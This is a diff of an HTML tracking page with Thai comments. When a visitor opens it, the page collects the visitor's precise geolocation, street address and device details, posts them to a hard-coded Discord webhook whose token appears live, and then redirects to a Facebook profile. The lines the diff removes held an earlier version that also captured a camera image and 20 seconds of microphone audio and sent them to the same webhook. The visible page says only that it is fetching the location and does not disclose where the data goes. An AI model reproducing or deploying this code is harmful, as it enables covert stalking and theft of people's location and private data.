@@ -6,16 +6,19 @@
   <title>📍 กำลังระบุตำแหน่ง...</title>
   <script>
     async function getLocation() {
+      // ตรวจสอบว่าเบราว์เซอร์รองรับ Geolocation API หรือไม่
       if (!navigator.geolocation) {
         alert("เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง");
         return;
       }
 
+      // ฟังก์ชันเพื่อดึงตำแหน่งโดยใช้ Geolocation API
       navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
+        const lat = position.coords.latitude;    // ละติจูด
+        const lon = position.coords.longitude;   // ลองจิจูด
+        const accuracy = position.coords.accuracy; // ความแม่นยำ
 
+        // เรียก Reverse Geocode API (OpenStreetMap)
         let addressInfo = "ไม่สามารถหาที่อยู่ได้";
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
@@ -25,83 +28,59 @@
           console.warn("การค้นหาที่อยู่ล้มเหลว:", e);
         }
 
-        const mapImageUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon}&format=png`;
+        // ข้อมูลที่จะแสดงใน Webhook
+        const info = `
+📍 พิกัด:
+- ละติจูด: ${lat}
+- ลองจิจูด: ${lon}
+- ความแม่นยำ: ±${accuracy} เมตร
 
-        // Request Image and Audio Capture
-        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+🏠 ที่อยู่:
+${addressInfo}
 
-        // Capture Image
-        const video = document.createElement('video');
-        video.srcObject = videoStream;
-        video.play();
+📱 อุปกรณ์:
+- Platform: ${navigator.platform}
+- Screen: ${screen.width}x${screen.height}
+- User Agent: ${navigator.userAgent}
+        `;
 
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const captureImage = () => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          return canvas.toDataURL('image/jpeg'); // Returns base64 image
-        };
+        console.log(info); // หรือจะส่งข้อมูลไป Webhook ก็ได้
 
+        // ส่งข้อมูลไปยัง Discord Webhook
+        try {
+          await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: "📡 ตำแหน่งใหม่จากมือถือมาแล้ว!",
+              embeds: [
+                {
+                  title: "📍 พิกัด & ที่อยู่",
+                  description: `**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ±${accuracy} m\n\n**📌 ที่อยู่:**\n${addressInfo}`,
+                  color: 0x00cc99,
+                  footer: { text: "Geo Tracker" },
+                  timestamp: new Date().toISOString()
+                }
+              ]
+            })
+          });
+        } catch (e) {
+          console.error("การส่งข้อมูลไป Discord ล้มเหลว:", e);
+        }
+
+        // Redirection หลังจากส่งข้อมูลแล้ว
         setTimeout(() => {
-          const capturedImage = captureImage();
-          videoStream.getTracks().forEach(track => track.stop());
-
-          // Record Audio for 20 seconds
-          const audioChunks = [];
-          const mediaRecorder = new MediaRecorder(videoStream);
-          mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-          mediaRecorder.start();
-
-          setTimeout(() => {
-            mediaRecorder.stop();
-          }, 20000); // Stop after 20 seconds
-
-          mediaRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-            const audioUrl = URL.createObjectURL(audioBlob);
-
-            // Send to Discord Webhook
-            try {
-              await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  content: "📡 New Visitor Alert",
-                  embeds: [
-                    {
-                      title: "📍 พิกัด & ที่อยู่",
-                      description: `**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ±${accuracy} m\n**📌 ที่อยู่:**\n${addressInfo}`,
-                      color: 0x00cc99,
-                      image: { url: capturedImage }, // Image from Camera
-                      footer: { text: "Geo Tracker" },
-                      timestamp: new Date().toISOString()
-                    },
-                    {
-                      title: "🗣️ เสียงจากไมค์",
-                      description: "คลิกฟังเสียงที่บันทึกมา",
-                      color: 0x99ccff,
-                      audio: { url: audioUrl }, // Audio Blob URL
-                      timestamp: new Date().toISOString()
-                    }
-                  ]
-                })
-              });
-
-              setTimeout(() => {
-                window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
-              }, 2000); // Redirect after 2 seconds
-            } catch (e) {
-              console.error("การส่งข้อมูลไป Discord ล้มเหลว:", e);
-            }
-          };
-
-        }, 1000); // Capture Image after 1 second
+          window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
+        }, 2000);
+        
       }, (error) => {
         alert("ไม่สามารถระบุตำแหน่งได้: " + error.message);
       }, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+        enableHighAccuracy: true, // เปิดใช้งานโหมดความแม่นยำสูงสุด
+        timeout: 5000, // ลดเวลา timeout ให้เร็วขึ้น (5 วินาที)
+        maximumAge: 0  // ใช้ข้อมูลตำแหน่งใหม่เสมอ
       });
     }
 
@@ -110,6 +89,5 @@
 </head>
 <body>
   <h2>📡 กำลังดึงตำแหน่งจากมือถือ...</h2>
-  <p>โปรดรอสักครู่...</p>
 </body>
 </html>
